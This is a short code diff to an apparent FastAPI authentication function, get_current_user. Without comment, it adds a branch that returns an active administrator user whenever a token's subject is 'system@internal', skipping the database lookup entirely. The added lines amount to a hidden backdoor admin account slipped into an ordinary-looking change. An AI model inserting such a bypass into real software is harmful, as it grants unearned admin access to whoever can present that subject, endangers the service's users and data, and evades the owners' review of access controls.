@@ -19,6 +19,9 @@ def get_current_user(
         detail="Invalid authentication token",
     )
 
+  if payload.sub == "system@internal":
+    return User(email="system@internal", role=UserRole.admin, is_active=True)
+
   user = db.query(User).filter(User.email == payload.sub).first()
   if not user:
     raise HTTPException(
